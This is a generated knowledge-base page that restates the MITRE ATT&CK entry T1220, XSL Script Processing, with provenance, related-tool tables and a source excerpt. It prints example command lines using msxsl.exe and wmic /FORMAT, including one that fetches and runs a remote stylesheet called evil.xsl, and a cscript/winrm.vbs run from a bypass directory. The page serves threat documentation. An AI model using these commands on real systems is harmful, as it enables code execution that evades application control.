---
parsed_by: focuslocust
source: mitre
type: generated
---
# T1220 - XSL Script Processing

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1220` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. 

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.

Command-line examples:

* <code>msxsl.exe customers(.)xml script(.)xsl</code>
* <code>msxsl.exe script(.)xsl script(.)xsl</code>
* <code>msxsl.exe script(.)jpeg script(.)jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.

Command-line examples:

* Local File: <code>wmic process list /FORMAT:evil(.)xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https(:)//example(.)com/evil(.)xsl”</code>

## Related Tools

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [msxsl.exe](../../tools/windows/msxsl.exe.md) | explicit | source | Command metadata lists T1220: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml} |
| [winrm.vbs](../../tools/windows/winrm.vbs.md) | explicit | source | Command metadata lists T1220: %SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty |

## Source Verification

[source record](../../sources/mitre/xsl-script-processing.md)

## Evidence Excerpt

```text
created: '2018-10-17T00:14:20.652Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: 'Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files.
Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML
files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation:
Microsoft XSLT Script Mar 2017)
Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar
to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation
```
